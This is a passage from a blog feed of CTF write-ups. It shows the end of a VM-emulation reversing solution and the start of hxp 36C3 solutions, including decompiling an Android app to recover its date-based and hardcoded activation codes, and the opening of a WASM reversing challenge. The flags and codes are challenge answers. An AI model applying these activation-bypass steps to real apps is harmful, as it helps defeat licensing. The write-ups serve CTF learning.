style=&#34;color:#ae81ff&#34;&gt;0x17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x38&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;]

i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
bval &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ret:
	opcode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data[i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;]
	op1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data[i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;]
	op2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data[i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;]

	&lt;span style=&#34;color:#75715e&#34;&gt;# print(&amp;#34;{}, {}, {}&amp;#34;.format(opcode, op1, op2))&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; opcode &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
		data[op1] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; op2
	&lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; opcode &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
		bval &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data[op1]
	&lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; opcode &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
		data[op1] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data[op1] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; bval
	&lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; opcode &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
		ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

	i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(data)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The first few numbers look like ASCII, converting them,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;125&lt;/span&gt;]
data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [chr(x) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; data]
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(data))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We get the flag - &lt;code&gt;FLAG{VMS-ARE-FOR-MALWARE}&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>hxp 36C3 CTF Writeups</title>
      <link>https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/</link>
      <pubDate>Sun, 29 Dec 2019 14:06:46 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/</guid>
      <description>&lt;p&gt;The hxp CTF happens every year along with the Chaos Communication Congress (a top security conference). This year was the 36th edition. This CTF is a major CTF, you know this when the CTF has a rating weight of 63.0 on CTFTime. Also, it is one of the qualifier events of &lt;a href=&#34;https://www.oooverflow.io/dc-ctf-2020-quals/&#34;&gt;DEFCON 2020 CTF&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I was playing solo on this one and gave one day to this CTF. I managed to solve 2 problems in the main CTF and 2 in the &lt;a href=&#34;https://kuchenblech.xyz/&#34;&gt;Junior CTF&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Here are the writeups for the challenges I solved.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;main-ctf&#34;&gt;Main CTF&lt;/h1&gt;
&lt;h2 id=&#34;1337-skills---android-rev&#34;&gt;1337 Skills - Android, Rev&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;App: &lt;a href=&#34;https://play.google.com/store/apps/details?id=com.progressio.wildskills&#34;&gt;Link&lt;/a&gt;&lt;br&gt;
Connection: nc 88.198.154.132 7002&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;First, I installed the app on my phone, to try to play around with it a bit. But the very first page was a login type screen asking for a code. I knew I had to open it in a decompiler to see what is happening and figure out the code. I extracted the APK of the app and opened it up in jadx.&lt;/p&gt;
&lt;p&gt;First I took a look at the AndroidManifest.xml, to find the launcher activity.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/manifest.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/manifest.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The class we have to check out first is the &lt;code&gt;com.progressio.wildskills.MainActivity&lt;/code&gt;. Opening this we see that the &lt;code&gt;onCreate&lt;/code&gt; method calls the &lt;code&gt;activateApp&lt;/code&gt; method to check the activation code.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;activateApp&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Integer&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;parseInt&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;editTextActivation&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getText&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;());&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;NumberFormatException unused&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
    Calendar instance &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Calendar&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getInstance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Math&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pow&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;instance&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; instance&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)),&lt;/span&gt; 2&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;0d&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; 999983&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;0d&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        findViewById&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;scrollViewActivation&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;setVisibility&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;4&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;InputMethodManager&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; getSystemService&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;input_method&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;hideSoftInputFromWindow&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;editTextActivation&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getWindowToken&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(),&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        SharedPreferences&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Editor&lt;/span&gt; edit &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;prefsmain&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;edit&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
        edit&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;putBoolean&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Activated&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; time &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Date&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getTime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
        edit&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;putLong&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Installed&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; time&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        edit&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;putLong&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ActivationDate&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; time&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        edit&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;commit&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
    Toast&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;makeText&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Ungültiger Aktivierungscode&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 1&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;show&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;editTextActivation&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;requestFocus&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;InputMethodManager&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; getSystemService&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;input_method&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;showSoftInput&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;editTextActivation&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 1&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We have to pay attenton to&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Math&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pow&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;instance&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; instance&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)),&lt;/span&gt; 2&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;0d&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; 999983&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;0d&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For 29th December 2019, this value is a constant and equal to &lt;code&gt;76429&lt;/code&gt;. Entering this, we get access to the app. Next on the top right corner of the app, there are options namely Sales, Leadership, Smart Profuction (the current page) and Service Roadmap. Each of these (except Smart Production) require their own activation codes. We deg deeper into the app&amp;rsquo;s code for this.&lt;/p&gt;
&lt;p&gt;One thing I note is that on entering a wrong code, the following message is shown as a Toast - &amp;ldquo;Ungültiger Aktivierungscode&amp;rdquo;. So, I used Jadx&amp;rsquo;s Text Search to find all instances of this. We find this&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/codes.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/codes.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;These are basically the codes for the three sections. Now all we have to do is connect to the given server and port and answer with these codes.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Activation code: 
76429
activated!
Sales activation code: 
sgk258
activated!
Leadership activation code: 
wmt275
activated
Service Roadmap (SRM) activation code: 
udh736
activated!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After this, we get the flag - &lt;code&gt;hxp{thx_f0r_4773nd1n6_70d4y}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;xmas_future---rev&#34;&gt;xmas_future - Rev&lt;/h2&gt;
&lt;p&gt;Files: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/files/files.zip&#34;&gt;files.zip&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This challenge is really close to my heart because this was the FIRST time ever I solved a WASM reveresing challenge. I literally had no clue on how to proceed, did a bit of researching and finally worked it out.&lt;/p&gt;
&lt;p&gt;First I thought of converting the .wasm file into some readable code like in C. I used the official &lt;a href=&#34;https://github.com/WebAssembly/wabt&#34;&gt;WebAssembly binary toolkit (wabt)&lt;/a&gt; for this. I used both the wasm2c and wasm2wat to get readable code. In the C file, there was one interesting function which was being called from the hxp2019.js file, the &lt;code&gt;check&lt;/code&gt; function, specifically the &lt;code&gt;$hxp2019::check::h578f31d490e10a31&lt;/code&gt; fnction. But it was a lot of code and I couldn&amp;rsquo;t make anyting out of it. Then I decided to read few wasm related CTF writeups. I learnt that I could actually use the debugger in the Chrome DevTools to go through it.&lt;/p&gt;
